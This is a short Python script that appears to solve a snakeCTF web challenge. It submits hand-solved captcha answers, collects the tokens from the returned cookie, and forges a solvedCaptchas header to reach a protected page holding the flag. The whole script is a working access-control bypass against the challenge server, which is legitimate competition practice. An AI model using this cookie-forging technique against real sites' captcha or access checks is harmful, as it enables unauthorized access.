import requests
import json
import urllib.parse

BASE = "https://0501d746d5e0d28cf2ba5004bbd0f0bd.blocked.challs.snakectf.org/"

# Solve them manually without validating them and store the solution here
CAPTCHAS = {
    "6de6162a9274b129823ba174" : "DCDRB2",
    "647ae4bd013aadadb9f87528" : "42GVD8",
    "269e7baedaeff2321a484d0f" : "UAS9G8",
    "faef1cd97abdd8212820b70f" : "DCN6XE",
    "a376c6e3f0d24d33ef985786" : "BTFMTS",
    "710ef950f9ddee539a6c058b" : "HSNRGS",
    "7a26b43dcb75da0d8122a9d7" : "7785P3",
    "c8a032e00f036b2b4916e950" : "9Q5GX9",
    "1809530bc3e9314ba902344b" : "23J6LS",
    "146dbd4b2c08c69fdee7bcd7" : "5KXP9Q",
    "ebee0e6a13d62cbe1b32b21f" : "SWDXVH",
    "02b12fdfcadc0af1ee92aa7b" : "2X2DFN",
    "43b0e0d636a402433c5dc586" : "76CPCD",
    "715d1d17d8f2d5f07e60cfd5" : "EWFHQU",
    "49c5c8d7008847205d40cf95" : "DVNDDX",
}

session = requests.Session()

all_tokens = []

# Solve all captchas and collect tokens
for cid, sol in CAPTCHAS.items():
    print(f"[+] Solve {cid} with {sol}")
    r = session.post(
        f"{BASE}/api/solve",
        json={"captchaId": cid, "solution": sol},
    )
    
    if "set-cookie" in r.headers and r.status_code == 200:
        sc = r.headers["set-cookie"]
        if sc.lower().startswith("solvedcaptchas="):
            cookie_val = sc.split(";",1)[0].split("=",1)[1]
            decoded = urllib.parse.unquote(cookie_val)
            try:
                arr = json.loads(decoded)
                all_tokens = arr
            except Exception as e:
                print("Cookie parse error:", e)

print("\n[+] Tokens collected :", all_tokens)

csv_tokens = "solvedCaptchas=" + ",".join(all_tokens)
print("[+] Header solvedCaptchas :", csv_tokens)

# Access protected page
session.headers.update({'Cookie' : csv_tokens})
r = session.get(f"{BASE}/protected")

# Retrieve flag
print("\n[+] Protected page content:")
print(r.text)
